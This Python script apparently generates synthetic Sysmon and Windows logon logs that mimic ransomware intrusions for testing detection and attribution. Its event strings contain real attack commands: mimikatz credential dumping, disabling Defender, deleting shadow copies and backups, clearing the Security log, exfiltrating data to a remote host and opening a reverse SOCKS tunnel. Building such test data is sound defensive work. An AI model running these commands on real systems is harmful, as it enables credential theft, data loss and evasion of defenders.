"""Genera incidentes de ejemplo a partir de los perfiles reales de cada grupo.

    python tools/make_apt_samples.py            # todos los grupos con perfil
    python tools/make_apt_samples.py Akira Qilin

Escribe `samples/apt/<grupo>.json` con logs en formato Splunk/Sysmon crudo, de
modo que al ingerirlos pasen por los mismos normalizadores que un export real.

QUE SON Y QUE NO SON
--------------------
Son incidentes **sinteticos**: las maquinas, los usuarios y las IP son
inventados. Lo que NO es inventado es el **arsenal**: las herramientas de cada
grupo salen de su perfil en la Ransomware Tool Matrix, y la nota de rescate del
indice de ransomware.live.

Sirven para dos cosas: ver como se ve en el grafo un incidente de cada familia, y
comprobar que la deteccion y la atribucion funcionan de punta a punta con datos
que no son los cuatro ficheros de la demo.

No sirven como deteccion validada ni como firma: un incidente real no sigue este
guion tan limpio.
"""

from __future__ import annotations

import hashlib
import json
import random
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional

ROOT = Path(__file__).resolve().parent.parent
DATA_DIR = ROOT / "glamdring" / "threat" / "data"
OUT_DIR = ROOT / "samples" / "apt"

# Escenario compartido: la misma organizacion ficticia en todos los ejemplos,
# para que se puedan comparar entre si sin que cambie el decorado.
DOMINIO = "CORP"
VICTIMA = "mgarcia"
PUESTO = "WKS-1180"
PUESTO_IP = "10.7.3.42"
SERVIDOR = "SRV-APP03"
SERVIDOR_IP = "10.7.1.20"
CONTROLADOR = "SRV-DC02"
CONTROLADOR_IP = "10.7.1.10"
FICHEROS = "SRV-FS01"
FICHEROS_IP = "10.7.1.31"

RUTA_TEMP = "C:\\Users\\mgarcia\\AppData\\Local\\Temp"
RUTA_PROGRAMDATA = "C:\\ProgramData"

# Ejecutables reales asociados a cada herramienta. Se reutiliza la tabla curada
# del script de inteligencia para no mantener dos listas.
sys.path.insert(0, str(ROOT / "tools"))
from fetch_threat_intel import ALIASES  # noqa: E402


def sha256(texto: str) -> str:
    return hashlib.sha256(texto.encode("utf-8")).hexdigest()


def binario_de(herramienta: str) -> str:
    """Nombre de ejecutable plausible para una herramienta del catalogo."""
    alias = ALIASES.get(herramienta)
    if alias:
        return alias[0]
    limpio = "".join(c for c in herramienta.lower() if c.isalnum() or c in "._-")
    return f"{limpio or 'tool'}.exe"


class Guion:
    """Va acumulando eventos con una linea temporal coherente."""

    def __init__(self, inicio: datetime) -> None:
        self.momento = inicio
        self.eventos: List[Dict[str, Any]] = []

    def avanza(self, minutos: float) -> datetime:
        self.momento += timedelta(minutes=minutos)
        return self.momento

    @property
    def ts(self) -> str:
        return self.momento.strftime("%Y-%m-%dT%H:%M:%S.000Z")

    # -- constructores de evento -------------------------------------------

    def proceso(self, host: str, imagen: str, cmdline: str,
                padre: str = "C:\\Windows\\explorer.exe",
                usuario: str = f"{DOMINIO}\\{VICTIMA}") -> None:
        self.eventos.append({
            "_time": self.ts,
            "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
            "source": "Sysmon",
            "host": host,
            "ComputerName": f"{host}.corp.local",
            "EventCode": "1",
            "User": usuario,
            "Image": imagen,
            "ParentImage": padre,
            "CommandLine": cmdline,
            "ProcessId": str(random.randint(2000, 9000)),
            "ParentProcessId": str(random.randint(500, 1999)),
            "Hashes": f"SHA256={sha256(imagen + cmdline).upper()}",
            "_raw": f"Sysmon EventID 1 Process Create {imagen}",
        })

    def red(self, host: str, imagen: str, destino_ip: str,
            destino_host: str = "", puerto: int = 443,
            origen_ip: str = PUESTO_IP) -> None:
        evento = {
            "_time": self.ts,
            "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
            "source": "Sysmon",
            "host": host,
            "ComputerName": f"{host}.corp.local",
            "EventCode": "3",
            "User": f"{DOMINIO}\\{VICTIMA}",
            "Image": imagen,
            "SourceIp": origen_ip,
            "SourcePort": str(random.randint(49152, 65535)),
            "DestinationIp": destino_ip,
            "DestinationPort": str(puerto),
            "Protocol": "tcp",
            "_raw": "Sysmon EventID 3 Network connection detected",
        }
        if destino_host:
            evento["DestinationHostname"] = destino_host
        self.eventos.append(evento)

    def fichero(self, host: str, ruta: str, imagen: str) -> None:
        self.eventos.append({
            "_time": self.ts,
            "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
            "source": "Sysmon",
            "host": host,
            "ComputerName": f"{host}.corp.local",
            "EventCode": "11",
            "User": f"{DOMINIO}\\{VICTIMA}",
            "Image": imagen,
            "TargetFilename": ruta,
            "Hashes": f"SHA256={sha256(ruta).upper()}",
            "_raw": "Sysmon EventID 11 File created",
        })

    def logon(self, host: str, correcto: bool, usuario: str = VICTIMA,
              origen_ip: str = PUESTO_IP, origen_host: str = PUESTO,
              tipo: int = 3) -> None:
        self.eventos.append({
            "_time": self.ts,
            "sourcetype": "WinEventLog:Security",
            "source": "WinEventLog:Security",
            "host": host,
            "ComputerName": f"{host}.corp.local",
            "EventCode": "4624" if correcto else "4625",
            "Account_Name": f"{DOMINIO}\\{usuario}" if correcto else usuario,
            "Account_Domain": DOMINIO,
            "Logon_Type": str(tipo),
            "Source_Network_Address": origen_ip,
            "Workstation_Name": origen_host,
            "_raw": f"EventCode={'4624' if correcto else '4625'} logon",
        })


def construye(grupo: str, perfil: Dict[str, Any],
              notas: Dict[str, Any]) -> List[Dict[str, Any]]:
    """Guion completo de un despliegue de ransomware para un grupo concreto."""
    random.seed(grupo)                     # mismo grupo -> mismo fichero siempre
    inicio = datetime(2026, 8, 24, 8, 40, tzinfo=timezone.utc)
    g = Guion(inicio)

    por_categoria = perfil.get("toolsByCategory", {})

    def toma(categoria: str, cuantas: int = 2) -> List[str]:
        lista = por_categoria.get(categoria, [])
        return lista[:cuantas]

    # -- acceso inicial ----------------------------------------------------
    g.proceso(PUESTO, "C:\\Program Files\\Microsoft Office\\root\\Office16\\outlook.exe",
              "outlook.exe", padre="C:\\Windows\\explorer.exe")
    g.avanza(3)
    g.proceso(PUESTO, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
              padre="C:\\Program Files\\Microsoft Office\\root\\Office16\\outlook.exe")
    g.avanza(2)

    # -- punto de apoyo: la herramienta RMM del grupo -----------------------
    for herramienta in toma("RMM Tools", 2):
        binario = binario_de(herramienta)
        ruta = f"{RUTA_PROGRAMDATA}\\{binario}"
        g.fichero(PUESTO, ruta, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe")
        g.avanza(1)
        g.proceso(PUESTO, ruta, f"{binario} --silent --install",
                  padre="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe")
        g.avanza(2)
    g.red(PUESTO, f"{RUTA_PROGRAMDATA}\\{binario_de(toma('RMM Tools', 1)[0])}"
          if toma("RMM Tools", 1) else "C:\\Windows\\System32\\svchost.exe",
          "185.220.101.44", puerto=443)
    g.avanza(6)

    # -- reconocimiento ----------------------------------------------------
    for herramienta in toma("Discovery", 3):
        binario = binario_de(herramienta)
        g.proceso(PUESTO, f"{RUTA_TEMP}\\{binario}", f"{binario} 10.7.0.0/16")
        g.avanza(2)
    g.proceso(PUESTO, "C:\\Windows\\System32\\cmd.exe",
              "cmd.exe /c net group \"Domain Admins\" /domain & nltest /dclist:corp.local")
    g.avanza(4)

    # -- credenciales ------------------------------------------------------
    for herramienta in toma("Credential Theft", 2):
        binario = binario_de(herramienta)
        cmd = (f"{binario} \"sekurlsa::logonpasswords\" exit"
               if "mimikatz" in binario else f"{binario} all")
        g.proceso(PUESTO, f"{RUTA_TEMP}\\{binario}", cmd)
        g.avanza(3)

    # -- evasion -----------------------------------------------------------
    for herramienta in toma("Defense Evasion", 2):
        binario = binario_de(herramienta)
        g.proceso(PUESTO, f"{RUTA_TEMP}\\{binario}", f"{binario} -disable")
        g.avanza(2)
    g.proceso(PUESTO, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true")
    g.avanza(5)

    # -- movimiento lateral ------------------------------------------------
    for intento in range(6):
        g.logon(CONTROLADOR, correcto=False, usuario="administrator")
        g.avanza(0.2)
    g.avanza(3)
    g.logon(CONTROLADOR, correcto=True, tipo=3)
    g.avanza(1)
    g.logon(SERVIDOR, correcto=True, tipo=3)
    g.avanza(1)
    g.logon(FICHEROS, correcto=True, tipo=3)
    g.avanza(2)

    ofensivas = toma("OffSec", 2)
    for herramienta in ofensivas:
        binario = binario_de(herramienta)
        g.proceso(CONTROLADOR, f"C:\\Windows\\Temp\\{binario}",
                  f"{binario} -target 10.7.1.0/24",
                  padre="C:\\Windows\\System32\\services.exe")
        g.avanza(3)

    # -- exfiltracion ------------------------------------------------------
    g.proceso(FICHEROS, "C:\\Program Files\\7-Zip\\7z.exe",
              f"7z.exe a -p{grupo.lower()}2026 C:\\Windows\\Temp\\data.7z \\\\{FICHEROS}\\finanzas\\*",
              padre="C:\\Windows\\System32\\cmd.exe")
    g.avanza(8)
    for herramienta in toma("Exfiltration", 2):
        binario = binario_de(herramienta)
        g.proceso(FICHEROS, f"C:\\Windows\\Temp\\{binario}",
                  f"{binario} copy C:\\Windows\\Temp\\data.7z remote:exfil --transfers 8")
        g.avanza(2)
        g.red(FICHEROS, f"C:\\Windows\\Temp\\{binario}", "45.132.88.17",
              puerto=443, origen_ip=FICHEROS_IP)
        g.avanza(10)

    for herramienta in toma("Networking", 1):
        binario = binario_de(herramienta)
        g.proceso(SERVIDOR, f"C:\\Windows\\Temp\\{binario}",
                  f"{binario} client 185.220.101.44:9001 R:socks")
        g.avanza(4)

    # -- inhibicion de la recuperacion -------------------------------------
    for host in (FICHEROS, SERVIDOR, CONTROLADOR):
        g.proceso(host, "C:\\Windows\\System32\\vssadmin.exe",
                  "vssadmin.exe delete shadows /all /quiet",
                  padre="C:\\Windows\\System32\\cmd.exe")
        g.avanza(0.5)
        g.proceso(host, "C:\\Windows\\System32\\wbadmin.exe",
                  "wbadmin.exe delete catalog -quiet",
                  padre="C:\\Windows\\System32\\cmd.exe")
        g.avanza(0.5)
        g.proceso(host, "C:\\Windows\\System32\\bcdedit.exe",
                  "bcdedit.exe /set {default} recoveryenabled no",
                  padre="C:\\Windows\\System32\\cmd.exe")
        g.avanza(0.5)
    g.avanza(3)

    # -- cifrado y nota ----------------------------------------------------
    cifrador = f"{grupo.lower().replace(' ', '')}.exe"
    nombre_nota = (perfil.get("notes") or ["README.txt"])[0]

    for host in (FICHEROS, SERVIDOR, CONTROLADOR, PUESTO):
        g.proceso(host, f"C:\\Windows\\Temp\\{cifrador}",
                  f"{cifrador} --path C:\\ --threads 16",
                  padre="C:\\Windows\\System32\\services.exe")
        g.avanza(0.5)
        g.fichero(host, f"C:\\{nombre_nota}", f"C:\\Windows\\Temp\\{cifrador}")
        g.avanza(0.3)
        g.fichero(host, f"C:\\Users\\Public\\Documents\\{nombre_nota}",
                  f"C:\\Windows\\Temp\\{cifrador}")
        g.avanza(0.4)

    g.proceso(CONTROLADOR, "C:\\Windows\\System32\\wevtutil.exe",
              "wevtutil.exe cl Security",
              padre="C:\\Windows\\System32\\cmd.exe")

    return g.eventos


def main(argv: List[str]) -> int:
    grupos = json.loads((DATA_DIR / "groups.json").read_text(encoding="utf-8"))
    notas = json.loads((DATA_DIR / "ransomnotes.json").read_text(encoding="utf-8"))

    pedidos = argv[1:] or sorted(grupos)
    OUT_DIR.mkdir(parents=True, exist_ok=True)

    escritos = 0
    for nombre in pedidos:
        perfil = grupos.get(nombre)
        if perfil is None:
            coincide = [k for k in grupos if k.lower() == nombre.lower()]
            if not coincide:
                print(f"  sin perfil: {nombre}")
                continue
            nombre, perfil = coincide[0], grupos[coincide[0]]

        eventos = construye(nombre, perfil, notas)
        destino = OUT_DIR / f"{nombre.replace(' ', '_')}.json"
        destino.write_text(json.dumps(eventos, indent=1, ensure_ascii=False) + "\n",
                           encoding="utf-8")
        nota = (perfil.get("notes") or ["README.txt"])[0]
        print(f"  {nombre:<20} {len(eventos):>3} eventos  nota: {nota}")
        escritos += 1

    print(f"\n{escritos} incidentes en {OUT_DIR.relative_to(ROOT)}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
